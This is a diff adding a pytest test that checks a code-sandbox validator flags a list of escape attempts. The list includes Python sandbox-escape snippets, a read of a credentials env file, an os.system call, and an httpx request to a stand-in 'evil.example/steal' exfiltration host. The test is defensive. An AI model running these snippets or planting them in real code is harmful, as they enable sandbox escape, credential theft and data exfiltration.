@@ -142,3 +142,20 @@ def test_names_and_remote_servers(tmp_path):
     assert spec.url == "https://mcp.notion.com/mcp" and spec.approval_required == ["*"]
     with pytest.raises(ToolError):
         builder.add_remote("bad", "http://insecure.example", "x")
+
+
+@pytest.mark.parametrize("escape", [
+    "import io\nio.open('/etc/buddy/buddy.env').read()",
+    "os.path.os.system('id')",
+    "from mcp.client.stdio import subprocess",
+    "x = ().__class__.__bases__[0].__subclasses__()",
+    "print(__builtins__)",
+    "httpx._client.os",
+    "import pathlib",
+    "from . import secrets",
+    "type('x', (), {})",
+    "httpx.get('http://evil.example/steal')",
+])
+def test_sandbox_escapes_are_caught(escape):
+    code = GOOD.replace('    return "pong"', "    " + escape.replace("\n", "\n    ") + '\n    return "pong"')
+    assert b.check_code(code, ["open-meteo.com"]), escape
